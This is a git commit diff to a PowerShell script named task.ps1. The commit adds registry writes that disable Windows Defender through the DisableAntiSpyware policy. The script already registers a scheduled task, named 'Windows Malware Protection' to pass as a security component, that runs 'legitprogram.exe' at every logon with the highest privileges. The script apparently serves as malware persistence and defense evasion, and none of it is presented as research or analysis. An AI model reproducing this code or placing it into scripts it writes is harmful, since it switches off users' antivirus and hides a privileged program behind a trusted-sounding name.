19bea5eb9fd4d3e21ee1cd50b776dd835850193e
Nooble <kieranaslett@gmail.com>
2019-01-31 22:25:14 +0000

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -1,3 +1,7 @@
+$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+$Name = "DisableAntiSpyware"
+$value = "1"
+New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
 $trigger = New-JobTrigger -AtLogon
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
 Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -TaskName "Windows Malware Protection"
